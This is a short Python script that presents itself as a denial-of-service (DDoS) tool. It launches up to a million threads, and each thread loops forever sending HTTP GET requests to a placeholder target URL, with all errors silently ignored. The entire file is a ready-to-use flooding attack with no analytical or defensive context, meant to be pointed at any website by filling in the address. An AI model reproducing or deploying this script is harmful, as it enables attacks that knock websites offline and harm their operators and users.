import requests
import threading

def send_request():
    try:
        while True:
            response = requests.get("Your Terget Website Url")
            print("Request sent!")
    except:
        pass

def start_ddos():
    threads = []
    for _ in range(1000000):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

start_ddos()
